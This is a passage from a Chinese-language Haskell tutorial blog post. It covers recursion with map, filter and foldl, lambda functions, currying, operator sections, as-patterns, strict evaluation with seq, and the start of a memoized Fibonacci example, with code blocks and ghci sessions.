print (greeting ++ <span class="string">&quot; world&quot;</span>)</span><br></pre></td></tr></table></figure><p>would print “hello world”.</p><p>But you could also use lots of <code>let</code>s:</p><figure class="highlight hs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">foo</span> =</span><br><span class="line"><span class="title">let</span> greeting = <span class="string">&quot;hello&quot;</span></span><br><span class="line">   greetee  = <span class="string">&quot;world&quot;</span> <span class="keyword">in</span></span><br><span class="line"> print (greeting ++ <span class="string">&quot; &quot;</span> ++ greetee)</span><br></pre></td></tr></table></figure><p>And you just need one <code>in</code> before you use the names you just defined.</p></blockquote><h2 id="递归示例-2">递归示例 2</h2><p>考虑以下 C 函数， <code>square</code> ，它对数组中的所有元素执行平方计算：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">square</span><span class="params">(<span class="type">double</span> *out, <span class="type">const</span> <span class="type">double</span> *in, <span class="type">size_t</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        out[i] = in[i] * in[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码展示了一个直观且常见的 loop 动作，它对输入数组中的所有元素执行同样的动作。以下是 Haskell 版本的 <code>square</code> 函数：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- file: ch04/square.hs</span></span><br><span class="line"></span><br><span class="line"><span class="title">square</span> :: [<span class="type">Double</span>] -&gt; [<span class="type">Double</span>]</span><br><span class="line"></span><br><span class="line"><span class="title">square</span> (x:xs) = x*x : square xs</span><br><span class="line"><span class="title">square</span> []     = []</span><br></pre></td></tr></table></figure><p>可以看到，非常的简洁，因为 Haskell 本身就采用递归的形式去定义列表。</p><h2 id="递归示例-3">递归示例 3</h2><p>因为对列表逐元素操作非常常见，所以内置了 <code>map</code> 函数，用法是 <code>map func oprand</code>。比如上一个问题可以写成这样</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Data.Char (<span class="title">toUpper</span>)</span><br><span class="line"></span><br><span class="line"><span class="title">square2</span> xs = map squareOne xs</span><br><span class="line">    <span class="keyword">where</span> squareOne x = x * x</span><br><span class="line"></span><br><span class="line"><span class="title">upperCase2</span> xs = map toUpper xs</span><br></pre></td></tr></table></figure><p>map 函数是一个非常常用的函数，它可以将一个函数应用到列表中的每一个元素，并将结果放入一个新的列表中。map 函数的类型签名和源码为</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">map</span> :: (a -&gt; b) -&gt; [a] -&gt; [b]</span><br><span class="line"><span class="title">map</span> _ []     = []</span><br><span class="line"><span class="title">map</span> f (x:xs) = f x : map f xs</span><br></pre></td></tr></table></figure><p>其中，a 和 b 是任意类型，map 函数接受两个参数：一个函数 f，以及一个列表 xs。它将 f 应用于 xs 中的每一个元素，并返回一个新的列表，其中包含了 f 应用于每一个元素后的结果。</p><h2 id="递归示例-4">递归示例 4</h2><p>对列表进行筛选，这也是很常见的，可以实现模式匹配来完成，也就是分支。这里是筛选列表中奇数元素。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">oddList</span> :: [<span class="type">Int</span>] -&gt; [<span class="type">Int</span>]</span><br><span class="line"></span><br><span class="line"><span class="title">oddList</span> (x:xs) | odd x     = x : oddList xs</span><br><span class="line">               | otherwise = oddList xs</span><br><span class="line"><span class="title">oddList</span> []                 = []</span><br></pre></td></tr></table></figure><p>Haskell 也内置了过滤的函数 <code>filter</code>，从下面的例子也可以看出用法，它可以将一个谓词函数应用到列表中的每一个元素上，并返回一个新的列表，其中只包含满足谓词条件的元素。函数签名和源码如下：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">filter</span> :: (a -&gt; <span class="type">Bool</span>) -&gt; [a] -&gt; [a]</span><br><span class="line"><span class="title">filter</span> _pred []    = []</span><br><span class="line"><span class="title">filter</span> pred (x:xs)</span><br><span class="line">  | pred x         = x : filter pred xs</span><br><span class="line">  | otherwise      = filter pred xs</span><br></pre></td></tr></table></figure><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">oddList</span> xs = filter condition xs</span><br><span class="line">  <span class="keyword">where</span> condition x = odd x</span><br></pre></td></tr></table></figure><h2 id="递归示例-5">递归示例 5</h2><p>折叠函数也是非常常见的，也就是每次取出列表的第一个元素，然后不断累积。因此，可以写出递归的形式：</p><p><code>foldl func initial_value list</code>，<code>func</code> 是对每个元素怎么操作，其中<code>func</code> 需要是接受 <code>a</code>, <code>b</code> 返回 <code>a</code> 的函数 <code>initial_value</code> 是初始的累加值，<code>list</code> 是被折叠列表。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">foldl</span> :: (a -&gt; b -&gt; a) -&gt; a -&gt; [b] -&gt; a</span><br><span class="line"></span><br><span class="line"><span class="title">foldl</span> step zero (x:xs) = foldl step (step zero x) xs</span><br><span class="line"><span class="title">foldl</span> _ zero []        = zero</span><br></pre></td></tr></table></figure><p>所以，字符串转数字可以更加简洁。step 函数必须是两个参数，第一个参数是累加值，第二个参数是列表中取出的元素。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Data.Char (<span class="title">digitToInt</span>)</span><br><span class="line"></span><br><span class="line"><span class="title">asInt</span> xs = foldl step <span class="number">0</span> xs</span><br><span class="line">  <span class="keyword">where</span> step acc x = acc*<span class="number">10</span> + digitToInt x</span><br></pre></td></tr></table></figure><p>再比如列表求和也可以写成</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sumList</span> xs = foldl step <span class="number">0</span> xs</span><br><span class="line">  <span class="keyword">where</span> step acc x = acc+x</span><br></pre></td></tr></table></figure><p>也可以简单的写成</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sumList</span> xs = foldl (+) <span class="number">0</span> xs</span><br></pre></td></tr></table></figure><p>也就是只需要定义累加值和元素的操作即可。</p><p>除了左折叠，也有右折叠 <code>foldr</code>，用法是相同的。</p><p><strong>但是不推荐使用<code>foldl</code></strong>，因为 Haskell 采用<strong>惰性求值</strong>(或者叫 <strong>非严格求值</strong>)，不到最后一刻就不会求值，会把大量的表达式存储在内存中，可能造成内存泄漏。而且效率也不高。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foldl (+) 0 (1:2:3:[])</span><br><span class="line">          == foldl (+) (0 + 1)             (2:3:[])</span><br><span class="line">          == foldl (+) ((0 + 1) + 2)       (3:[])</span><br><span class="line">          == foldl (+) (((0 + 1) + 2) + 3) []</span><br><span class="line">          ==           (((0 + 1) + 2) + 3)</span><br></pre></td></tr></table></figure><p>每个表达式都保存在一个块中，这么多表达式嵌套，内存消耗会比较大，远不如直接进行数值运算。比如，内置的函数会显示堆栈溢出，而优化后的函数可以快速求解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; foldl  (+) 0 [1..100000000]</span><br><span class="line">*** Exception: stack overflow</span><br><span class="line"></span><br><span class="line">Prelude&gt; :module +Data.List</span><br><span class="line">Prelude Data.List&gt; foldl&#x27;  (+) 0 [1..100000000]</span><br><span class="line">5000000050000000</span><br></pre></td></tr></table></figure><h1>匿名函数</h1><p>有时，我们需要编写一个在应用程序的整个生命周期中只能使用一次的函数。为了应对这种情况，Haskell 开发人员使用了另一个称为 lambda 表达式或 lambda 函数的匿名块。Lambda 函数由<code>\</code>字符表示。关于它存在的意义，可以参考 <a href="https://stackoverflow.com/users/1482749/kosmikus">kosmikus</a> 的回答：</p><blockquote><p>Many Haskell functions are “higher-order functions”, i.e., they expect other functions as parameters. Often, the functions we want to pass to such a higher-order function are used only once in the program, at that particular point. It’s simply more convenient then to use a lambda expression than to define a new local function for that purpose.</p></blockquote><p>这里高阶函数的意思是，把函数作为参数的函数，前面提到的 <code>map</code> <code>filter</code> 都是高阶函数。例如这里只要大于 10 的偶数，那么直接用匿名函数，就不需要再用 <code>where</code> 去解释说明了。但是 也说明 lambda 函数的定义只能有一条语句。我们在很多情况下都会避免使用 lambda 。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">filter</span> (\ x -&gt; even x &amp;&amp; x &gt; <span class="number">10</span>) [<span class="number">1</span>..<span class="number">20</span>]</span><br></pre></td></tr></table></figure><p>匿名函数以反斜杠符号 <code>\</code> 为开始，后跟函数的参数（可以包含模式），而函数体定义在 <code>-&gt;</code> 符号之后。</p><p>例如下面的代码，判断元素是否包含在列表中。<code>isInAny &quot;abc&quot; [&quot;a&quot;,&quot;xyz&quot;,&quot;abcd&quot;]</code> 会返回 True。其中 <code>isInfixOf </code> 用于判断一个列表是否是另一个列表的子串，函数签名为 <code>isInfixOf :: Eq a =&gt; [a] -&gt; [a] -&gt; Bool</code>，<code>Eq</code> 是一个类型类，它表示可以进行相等性测试的类型。<strong>类型类是一组类型的集合</strong>，它们共享一些特定的行为或属性，因此可以用相同的函数或操作符来处理这些类型。</p><p><code>import</code> 用于导入其他模块中定义的函数、类型和常量等。导入一个模块时，Haskell 会在当前目录或全局搜索路径中查找指定的模块，并将该模块中的所有可见定义导入到当前模块的作用域中。除了导入整个模块之外，你还可以指定要导入的函数、类型和常量等。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 导入 Data.List 模块中的所有定义</span></span><br><span class="line"><span class="keyword">import</span> Data.List</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 导入 Data.List 模块中的 sort 和 intersperse 函数</span></span><br><span class="line"><span class="keyword">import</span> Data.List (<span class="title">sort</span>, <span class="title">intersperse</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 导入 Data.List 模块中的所有定义，但是不包括 foldl 函数</span></span><br><span class="line"><span class="keyword">import</span> Data.List <span class="keyword">hiding</span> (<span class="title">foldl</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 导入 Data.List 模块中的所有定义，并将它们重命名为 L</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">qualified</span> Data.List <span class="keyword">as</span> L</span><br></pre></td></tr></table></figure><p>所以，下面 <code>isInAny</code> 第一个参数是 可以进行相等性测试的列表，第二个参数是 <code>a</code> 的类型为 <code>t</code> 的容器类型，比如 <code>a</code> 的列表就是一个容器类型 。所以 <code>needle</code> 是列表，<code>haystack</code> 是包含了列表的容器，比如列表为元素的列表。<code>isInfixOf :: Eq a =&gt; [a] -&gt; [a] -&gt; Bool</code> 需要接受两个列表，表示第二个列表是否包含第一个列表。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Data.List (<span class="title">isInfixOf</span>)</span><br><span class="line"></span><br><span class="line"><span class="title">isInAny</span> :: (<span class="type">Foldable</span> t, <span class="type">Eq</span> a) =&gt; [a] -&gt; t [a] -&gt; <span class="type">Bool</span></span><br><span class="line"><span class="title">isInAny</span> needle haystack = any inSequence haystack</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    inSequence s = needle `isInfixOf` s</span><br><span class="line"><span class="comment">&#123;-相当于</span></span><br><span class="line"><span class="comment">any :: Foldable t =&gt; (a -&gt; Bool) -&gt; t a -&gt; Bool</span></span><br><span class="line"><span class="comment">isInAny needle haystack = any (isInfixOf needle) haystack</span></span><br><span class="line"><span class="comment">函数签名可以这样看 any ([a]-&gt;Bool) [[a]]，最终返回Bool</span></span><br><span class="line"><span class="comment">-&#125;</span></span><br></pre></td></tr></table></figure><ul><li><code>isInfixOf</code>：反引号表示标识符转换成二元中缀运算符，也就是参数可以写在两边。</li></ul><p>可以写成下面的形式</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">isInAny</span> needle haystack = any (\s -&gt; needle `isInfixOf` s) haystack</span><br></pre></td></tr></table></figure><p><img src="http://cdn.blog-blockchain.xyz/202304091323989.png" alt="image-20230409132322865"></p><p>注意 ghci 多行代码的写法，首先是 <code>:&#123;</code> 换行，然后开始写，最后单独一行 <code>&#125;:</code>，比如下图。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ghci&gt; :&#123;</span><br><span class="line">ghci| isInAny :: (Foldable t, Eq a) =&gt; [a] -&gt; t [a] -&gt; Bool</span><br><span class="line">ghci| isInAny needle haystack = any inSequence haystack</span><br><span class="line">ghci|   where</span><br><span class="line">ghci|     inSequence s = needle `isInfixOf` s</span><br><span class="line">ghci| :&#125;</span><br></pre></td></tr></table></figure><h1>函数柯里化</h1><p>柯里化：当一个函数有多个参数的时候，先传递一部分参数调用它(这部分参数以后永远不变)，然后返回一个新的函数接收剩余的参数，返回结果。</p><p>这其实很像链式调用，但是更加灵活。我们曾经提到 <code>a-&gt;a-&gt;a</code> 表示的是连续的返回值，第一次返回函数 <code>a-&gt;a</code>，第二次返回 <code>a</code>。**在 Haskell 中，所有函数都只接受一个参数！**但是为了方便起见，从语法上来说，我们也可以说它接受多个参数。下面看几个例子。</p><h2 id="第一个例子">第一个例子</h2><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">dropWhile</span> :: (a -&gt; <span class="type">Bool</span>) -&gt; [a] -&gt; [a]</span><br><span class="line"><span class="title">isSpace</span> :: <span class="type">Char</span> -&gt; <span class="type">Bool</span></span><br><span class="line"><span class="title">dropWhile</span> isSpace :: [<span class="type">Char</span>] -&gt; [<span class="type">Char</span>]</span><br></pre></td></tr></table></figure><ul><li><code>dropWhile</code> 是内置函数，第一个参数是条件，第二个参数是列表，遍历列表，从左到右去除满足条件的元素，直到出现不满足条件的元素。</li><li><code>isSpace</code> 是 <code>Data.Char</code> 里的函数，判断字符是否是空格。</li></ul><p>可以发现，实际上 <code>dropWhile</code> 只接受一个参数，然后接受了之后就变成了新的表达式。<code>a</code> 表示不限制类型，<code>isSpace</code> 作为参数之后，就变成了 <code>[Char] -&gt; [Char]</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*Main&gt; :m +Data.Char</span><br><span class="line">*Main Data.Char&gt; dropWhile isSpace &quot;    a b&quot;</span><br><span class="line">&quot;a b&quot;</span><br></pre></td></tr></table></figure><h2 id="第二个例子">第二个例子</h2><p><code>zip3</code> 函数是将三个列表转换成一个三元组。类型如下，请仔细观察函数类型的变化，可以非常直观地理解柯里化的过程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; :type zip3</span><br><span class="line">zip3 :: [a] -&gt; [b] -&gt; [c] -&gt; [(a, b, c)]</span><br><span class="line"></span><br><span class="line">*Main Data.Char&gt; :t zip3 &quot;foo&quot;</span><br><span class="line">zip3 &quot;foo&quot; :: [b] -&gt; [c] -&gt; [(Char, b, c)]</span><br><span class="line"></span><br><span class="line">*Main Data.Char&gt; :t zip3 &quot;foo&quot; &quot;bar&quot;</span><br><span class="line">zip3 &quot;foo&quot; &quot;bar&quot; :: [c] -&gt; [(Char, Char, c)]</span><br><span class="line"></span><br><span class="line">*Main Data.Char&gt; :t zip3 &quot;foo&quot; &quot;bar&quot; &quot;quux&quot;</span><br><span class="line">zip3 &quot;foo&quot; &quot;bar&quot; &quot;quux&quot; :: [(Char, Char, Char)]</span><br><span class="line"></span><br><span class="line">Prelude&gt; zip3 &quot;foo&quot; &quot;bar&quot; &quot;quux&quot;</span><br><span class="line">[(&#x27;f&#x27;,&#x27;b&#x27;,&#x27;q&#x27;),(&#x27;o&#x27;,&#x27;a&#x27;,&#x27;u&#x27;),(&#x27;o&#x27;,&#x27;r&#x27;,&#x27;u&#x27;)]</span><br></pre></td></tr></table></figure><h2 id="回顾例子">回顾例子</h2><p>重新回顾我们在匿名函数中讨论过的例子</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Data.List (<span class="title">isInfixOf</span>)</span><br><span class="line"></span><br><span class="line"><span class="title">isInAny</span> :: (<span class="type">Foldable</span> t, <span class="type">Eq</span> a) =&gt; [a] -&gt; t [a] -&gt; <span class="type">Bool</span></span><br><span class="line"><span class="title">isInAny</span> needle haystack = any inSequence haystack</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    inSequence s = needle `isInfixOf` s</span><br></pre></td></tr></table></figure><p>其中 EQ 类型类用于相等的条件判断，也就是可比较的类型。</p><blockquote><p>The <strong>Eq</strong> typeclass provides an interface for testing for equality. Any type where it makes sense to test for equality between two values of that type should be a member of the <strong>Eq</strong> class. All standard Haskell types except for IO (the type for dealing with input and output) and functions are a part of the <strong>Eq</strong> typeclass.</p><p>–<a href="http://learnyouahaskell.com/types-and-typeclasses">http://learnyouahaskell.com/types-and-typeclasses</a></p></blockquote><p>所以说，<code>isInAny</code> 的参数是可折叠的类型和可以比较的类型。实际上的等价映射是 <code>[a] -&gt; t [a] -&gt; Bool</code>，首先需要一个列表，然后可折叠类型的元素逐个和可比较的类型相比，最后返回布尔值。</p><p>又看 <code>any</code> 的类型 <code>any :: Foldable t =&gt; (a -&gt; Bool) -&gt; t a -&gt; Bool</code>，发现它是一个可折叠类型；</p><p>又看 <code>inSequence</code> 的类型 <code>inSequence :: Eq a =&gt; [a] -&gt; [a] -&gt; Bool</code> 是一个做比较返回布尔值的类型。</p><p>总之，函数定义的时候可以简化，<strong>如果已经高阶函数的函子已经定义了参数，那么定义时可以省略高阶函数的最后一个参数</strong>，因为<code>any</code> 已经指定了函数类型了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*Main Data.Char&gt; isInAny needle = any (\s -&gt; needle `isInfixOf` s)</span><br><span class="line">*Main Data.Char&gt; :type isInAny</span><br><span class="line">isInAny :: (Foldable t, Eq a) =&gt; [a] -&gt; t [a] -&gt; Bool</span><br></pre></td></tr></table></figure><h1>节（section)</h1><p>之前提到过，使用反引号 `` <code>可以将标识符转换成二元中缀运算符。而节比较特殊，使用括号包围一个操作符，通过在括号里面提供左操作对象或者右操作对象，可以产生一个部分应用函数。具体来说</code>(*3)` 就是部分应用函数，可以实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; map (2^) [3, 5, 7, 9]</span><br><span class="line">[8,32,128,512]</span><br></pre></td></tr></table></figure><h1>As-模式</h1><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">suffixes</span> :: [a] -&gt; [[a]]</span><br><span class="line"><span class="title">suffixes</span> xs@(_ : xs&#x27;) = xs : suffixes xs&#x27;</span><br><span class="line"><span class="title">suffixes</span> [] = []</span><br><span class="line"></span><br><span class="line"><span class="title">main</span> = print $suffixes <span class="string">&quot;foot&quot;</span></span><br></pre></td></tr></table></figure><p>As-模式在之前已经学习过了。源码里面用到了新引入的 <code>@</code> 符号，模式 <code>xs@(_:xs')</code> 被称为 as-模式，它的意思是：如果输入值能匹配 <code>@</code> 符号右边的模式（这里是 <code>(_:xs')</code> ），那么就将这个值绑定到 <code>@</code> 符号左边的变量中（这里是 <code>xs</code> ）。相当于多了一个参数，从 <code>xs</code> 中拆解出了 <code>xs'</code>。</p><p>As-模式还有其他作用：它可以对输入数据进行共享，而不是复制它，减少了内存消耗。</p><p><code>$</code> 运算符表示右结合，相当于给右边的部分加一个括号，用于简化函数的嵌套调用，比如如何的用法。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 括号版本</span></span><br><span class="line"><span class="title">sum</span> (filter (&gt; <span class="number">0</span>) (map (* <span class="number">2</span>) [<span class="number">1</span>, -<span class="number">2</span>, <span class="number">3</span>, -<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 使用 $ 运算符</span></span><br><span class="line"><span class="title">sum</span> $ filter (&gt; <span class="number">0</span>) $ map (* <span class="number">2</span>) [<span class="number">1</span>, -<span class="number">2</span>, <span class="number">3</span>, -<span class="number">4</span>]</span><br></pre></td></tr></table></figure><p>运算符 <code>.</code> 的功能类似，可以将多个函数组合成一个新的函数，将右侧的函数作为左侧函数的参数。这样可以少写几个括号，看起来更加简洁。下面新的函数 <code>h</code> 表示参数先加 <code>1</code>，然后再乘以 <code>2</code>，从而得到一个新的输出结果。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 定义一个函数 f 和一个函数 g</span></span><br><span class="line"><span class="title">f</span> :: <span class="type">Int</span> -&gt; <span class="type">Int</span></span><br><span class="line"><span class="title">f</span> x = x * <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="title">g</span> :: <span class="type">Int</span> -&gt; <span class="type">Int</span></span><br><span class="line"><span class="title">g</span> x = x + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 使用 . 运算符将 f 和 g 组合成一个新的函数 h</span></span><br><span class="line"><span class="title">h</span> :: <span class="type">Int</span> -&gt; <span class="type">Int</span></span><br><span class="line"><span class="title">h</span> = f . g</span><br></pre></td></tr></table></figure><h1>严格求值</h1><p>严格求值就是非惰性求值，它解决了暂存大量的表达式造成堆栈溢出的问题，但是如果不适当地使用，会增大计算量。</p><p>之前地例子是 <code>foldl</code> 非严格求值，而 <code>foldl'</code> 是严格求值。<code>seq</code> 函数是比较典型地严格求值的例子。我大致的理解是，</p><blockquote><p>（seq a b）it evaluates the first argument <code>a</code> to weak head normal form (WHNF). The only guarantee given by <code>seq</code> is that the both <code>a</code> and <code>b</code> will be evaluated before <code>seq</code> returns a value.</p><p>——<a href="https://hackage.haskell.org/package/base-4.17.0.0/docs/Prelude.html#v:seq">https://hackage.haskell.org/package/base-4.17.0.0/docs/Prelude.html#v:seq</a></p></blockquote><p>也就是说，在返回之前它会把第一个参数求值，直到满足 WHNF，但是不一定 <code>a</code> 比 <code>b</code> 先求值。比如如果 <code>a</code> 依赖 <code>b</code>，那么就可能是 <code>b</code> 先求值。</p><p>WHNF 是什么呢？可以参考下面的回答：</p><blockquote><p><strong>Normal form</strong>: An expression in normal form is fully evaluated, and no sub-expression could be evaluated any further (i.e. it contains no un-evaluated thunks).</p><p><strong>Weak head normal form</strong>: An expression in weak head normal form has been evaluated to the outermost data constructor or lambda abstraction (the <em>head</em>). Sub-expressions <em>may or may not have been evaluated</em>. Therefore, every normal form expression is also in weak head normal form, though the opposite does not hold in general.</p><p>– <a href="https://stackoverflow.com/a/6889335/15272222">https://stackoverflow.com/a/6889335/15272222</a></p></blockquote><p>来看一个例子：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">myFoldl</span> f a [] = a</span><br><span class="line"><span class="title">myFoldl</span> f a (x : xs) = <span class="keyword">let</span> a&#x27; = f a x <span class="keyword">in</span> a&#x27; `seq` myFoldl f a&#x27; xs</span><br><span class="line"></span><br><span class="line"><span class="title">mySum</span> xs = myFoldl (\x b -&gt; x + b) <span class="number">0</span> xs</span><br><span class="line"></span><br><span class="line"><span class="title">main</span> = print $ mySum [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><p><code>seq</code> 让 <code>let a' = f a x in a'</code> 严格求值。</p><h1>斐波那契数列的优化</h1><p>这一部分会学些一些编码技巧，斐波那契数列最直观的逻辑如下，但是函数对应的值是不会缓存的，所以会具有指数级复杂度。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">fibOriginal</span> :: <span class="type">Int</span> -&gt; <span class="type">Integer</span></span><br><span class="line"><span class="title">fibOriginal</span> <span class="number">0</span> = <span class="number">0</span></span><br><span class="line"><span class="title">fibOriginal</span> <span class="number">1</span> = <span class="number">1</span></span><br><span class="line"><span class="title">fibOriginal</span> n = fibOriginal (n - <span class="number">1</span>) + fibOriginal (n - <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>我们考虑缓存中间结果，这样就可以节省计算量。<code>cache</code> 是一个列表，缓存了结果，如果缓存了特定的位置，那么就求值，否则这个位置是 Nothing。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">fibList</span> :: <span class="type">Int</span> -&gt; <span class="type">Integer</span></span><br><span class="line"><span class="title">fibList</span> n = fib&#x27; n (replicate (n + <span class="number">1</span>) <span class="type">Nothing</span>)</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    fib&#x27; :: <span class="type">Int</span> -&gt; [<span class="type">Maybe</span> <span class="type">Integer</span>] -&gt; <span class="type">Integer</span></span><br><span class="line">    fib&#x27; <span class="number">0</span> cache = <span class="number">0</span></span><br><span class="line">    fib&#x27; <span class="number">1</span> cache = <span class="number">1</span></span><br><span class="line">    fib&#x27; n cache =</span><br><span class="line">      <span class="keyword">case</span> cache !! n <span class="keyword">of</span></span><br><span class="line">        <span class="type">Just</span> value -&gt; value</span><br><span class="line">        <span class="type">Nothing</span> -&gt;</span><br><span class="line">          <span class="keyword">let</span> value = fib&#x27; (n - <span class="number">1</span>) cache + fib&#x27; (n - <span class="number">2</span>) cache</span><br><span class="line">              newCache = updateCache n value cache</span><br><span class="line">          <span class="keyword">in</span> fib&#x27; n newCache</span><br><span 